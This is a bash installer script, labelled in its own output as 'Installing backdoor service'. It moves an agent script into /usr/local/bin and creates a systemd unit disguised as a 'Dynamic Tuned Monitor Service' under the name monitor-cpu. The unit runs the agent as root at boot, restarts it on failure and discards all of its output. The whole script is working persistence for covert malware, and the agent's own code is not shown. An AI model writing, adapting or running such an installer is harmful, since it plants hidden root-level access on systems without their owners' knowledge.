#!/bin/bash

# === CONFIG ===
SERVICE_NAME="monitor-cpu"
AGENT_NAME="monitor-cpu.py"
CURRENT_PATH=$(pwd)
INSTALL_PATH="/usr/local/bin"
CONFIG_PATH="/usr/lib/tuned"
SERVICE_PATH="/etc/systemd/system"

echo "[+] Installing backdoor service..."

# === Move agent ===
echo "[+] Moving agent to $INSTALL_PATH..."
sudo mv $CURRENT_PATH/$AGENT_NAME $INSTALL_PATH/$SERVICE_NAME.py

# === Move config ===
if [ -f $CURRENT_PATH/config.json ]; then
    echo "[+] Moving config.json..."
    sudo mv $CURRENT_PATH/config.json $CONFIG_PATH/config.json
fi

# === Set permissions ===
echo "[+] Setting permissions..."
sudo chmod +x $INSTALL_PATH/$SERVICE_NAME.py

# === Create systemd service ===
echo "[+] Creating systemd service..."

sudo bash -c "cat > $SERVICE_PATH/$SERVICE_NAME.service" <<EOF
[Unit]
Description=Dynamic Tuned Monitor Service
After=network.target

[Service]
Type=simple
ExecStartPre=/bin/sleep 5
ExecStart=/usr/bin/python $INSTALL_PATH/$SERVICE_NAME.py
Restart=on-failure
RestartSec=5
StandardOutput=null
StandardError=null
User=root

[Install]
WantedBy=multi-user.target
EOF

# === Reload systemd ===
echo "[+] Reloading systemd..."
sudo systemctl daemon-reexec
sudo systemctl daemon-reload

# === Enable service ===
echo "[+] Enabling service..."
sudo systemctl enable $SERVICE_NAME.service

# === Start service ===
echo "[+] Starting service..."
sudo systemctl start $SERVICE_NAME.service

echo "[+] Installation complete!"